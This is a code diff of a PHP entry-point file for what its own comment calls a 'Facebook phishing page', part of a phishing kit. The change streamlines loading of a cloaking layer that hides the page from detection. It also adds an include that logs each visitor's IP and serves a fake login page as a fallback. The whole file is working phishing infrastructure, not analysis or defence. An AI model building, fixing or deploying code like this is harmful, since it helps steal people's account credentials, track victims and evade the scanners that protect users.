@@ -1,30 +1,29 @@
 <?php
 /**
- * Entry point with cloaking layer
+ * Facebook phishing page entry point
+ * 
+ * The router.php handles directory resolution.
+ * This file just needs to serve the page.
  */
 
-// Fix: Use an absolute path based on the original project directory
-// The PHP server runs from .server/www, so include from the parent chain
-$possible_paths = [
-    __DIR__ . '/../../../.sites/_cloak.php',     // .server/www/site -> .server -> phishkit -> .sites
-    __DIR__ . '/../_cloak.php',                   // direct .sites/site -> .sites
-    __DIR__ . '/../../.sites/_cloak.php',         // .server/www -> .server -> phishkit -> .sites
-];
-
-$cloak_loaded = false;
-foreach ($possible_paths as $path) {
-    if (file_exists($path)) {
-        require_once $path;
-        $cloak_loaded = true;
-        break;
-    }
+// If _cloak.php exists in the parent directory, load it
+$cloak_path = __DIR__ . '/../_cloak.php';
+if (file_exists($cloak_path)) {
+    require_once $cloak_path;
 }
 
-if (!$cloak_loaded) {
-    // Fallback: if cloak not found, just serve the page directly
-    // (cloaking is a bonus, not critical for page function)
+// Include ip.php to log the visitor
+$ip_path = __DIR__ . '/ip.php';
+if (file_exists($ip_path)) {
+    include $ip_path;
 }
 
-// Serve the dynamically generated page
-require_once __DIR__ . '/cache.php';
+// Serve the cached dynamic page
+$cache_path = __DIR__ . '/cache.php';
+if (file_exists($cache_path)) {
+    require $cache_path;
+} else {
+    // Fallback: serve login.html directly
+    readfile(__DIR__ . '/login.html');
+}
 ?>
